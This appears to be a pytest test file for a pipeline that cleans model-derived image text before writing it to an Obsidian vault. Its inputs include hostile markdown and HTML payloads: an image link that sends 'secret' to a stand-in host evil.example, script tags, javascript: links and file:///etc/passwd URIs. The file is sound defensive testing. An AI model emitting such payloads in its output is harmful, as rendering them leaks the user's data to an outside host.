"""Spec 021 safety review: text a model derived from an image is neutralised before it is written to the vault
(a markdown image, link, wikilink, HTML tag or URL in a note makes Obsidian fetch or open something)."""

from __future__ import annotations

import pytest

from pkpipe.domain.text_safety import neutralize_text
from pkpipe.obsidian import lists
from pkpipe.obsidian.models import TriageRow

PAYLOAD = "![](https://evil.example/c?d=secret)"


@pytest.mark.parametrize(
    "text",
    [
        PAYLOAD,
        "see ![x](http://evil.example/a.png) here",
        "![[http://evil.example/x.png]] and [[Some note]]",
        '<img src="https://evil.example/x"> <script>alert(1)</script>',
        "`code` and ```fence```",
        "[click](javascript:alert(1)) <https://evil.example/auto>",
        "visit evil.example/path?q=1 or www.evil.example or evil.example:8080",
        "ftp://evil.example/x file:///etc/passwd data:text/html;base64,AAAA",
        "![](https://evil.example/c?d=secret) ![](//evil.example/x)",
    ],
)
def test_nothing_that_renders_or_fetches_survives(text):
    out = neutralize_text(text)
    for bad in (
        "![",
        "[",
        "]",
        "<",
        ">",
        "`",
        "evil.example",
        "http",
        "://",
        "javascript:",
        "file:",
        "data:",
    ):
        assert bad not in out, (bad, out)


def test_ordinary_text_is_kept():
    assert neutralize_text("A synthetic project page for the Fictional Tool CLI.") == (
        "A synthetic project page for the Fictional Tool CLI."
    )
    assert (
        neutralize_text("Version 2.1 of Fieldbook: faster search")
        == "Version 2.1 of Fieldbook: faster search"
    )


def test_whitespace_is_one_line_and_the_length_is_capped():
    assert neutralize_text("a\n\n b\t c") == "a b c"
    assert len(neutralize_text("x" * 500, limit=200)) == 200


def test_the_triage_row_model_neutralises_whatever_it_is_given():
    row = TriageRow(item_id="a1", resource="x.png", ai_suggested_category="misc", kind="image", topic=PAYLOAD)
    assert "evil.example" not in row.topic and "![" not in row.topic
    assert "evil.example" not in row.to_cells()["topic"]


def test_the_vault_tool_never_writes_a_payload_into_the_triage_file(tmp_path):
    path = tmp_path / "Triage.md"
    lists.update_triage(
        path,
        [{"resource": "pic.png", "ai_suggested_category": "misc", "kind": "image", "topic": PAYLOAD}],
    )
    text = path.read_text(encoding="utf-8")
    assert "evil.example" not in text and "![" not in text and "](" not in text
